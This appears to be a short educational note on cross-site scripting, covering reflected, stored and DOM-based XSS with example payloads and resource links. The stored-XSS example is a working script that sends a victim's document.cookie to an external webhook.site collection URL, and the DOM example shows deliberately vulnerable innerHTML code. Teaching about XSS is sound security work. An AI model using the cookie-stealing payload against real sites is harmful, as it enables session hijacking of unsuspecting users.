# Cross-Site Scripting (XSS)

 Cross-Site Scripting is injecting malicious javascript into web pages to steal cookies or session tokens of the other user. The attacker uploads a malicious javascript in web application (example post malicious javascript in comments) which run in the another user browser when they visit the application 

**Types of Cross-Site Scripting**

- Reflected XSS
- Stored XSS 
- DOM-based XSS 

## Reflected XSS

Reflected XSS where we have some inputs, and can send the payload in our HTTP request, and our input reflected in the response back to us. But if we were refresh the page, or if somebody else was to visit that page, they wouldn't see our payload. This somewhat limits the scope of the attack, but is still worth looking out 

**Example Payload** 

```
<script>alert("Reflected XSS")</script>
```

## Stored XSS 

It stores the payload somewhere like in database and executed when other uses visits it. For example when we leave payload on a comment in a product page whenever another user loads the page they can tigger our payload and can malicious script are executed in their browser used for stealing cookies, etc 

**Example Payload**

```
<script>
fetch("https://webhook.site/web_hook_id?c=" + document.cookie);
</script>
```

## DOM-based XSS

The payload doesn't go to the server, it's only processed locally, and therefore, can't be filtered server-side

**Example**

```
// Vulnerable code 
var name = location.hash.substring(1);
document.getElementById("welcome").innerHTML = "Hello " + name;

// attacker payload 
http://victim.com/#<script>alert('DOM XSS')</script>
```

## Resources

- [hacktricks - xss](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
- [payloads all the things - xss](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

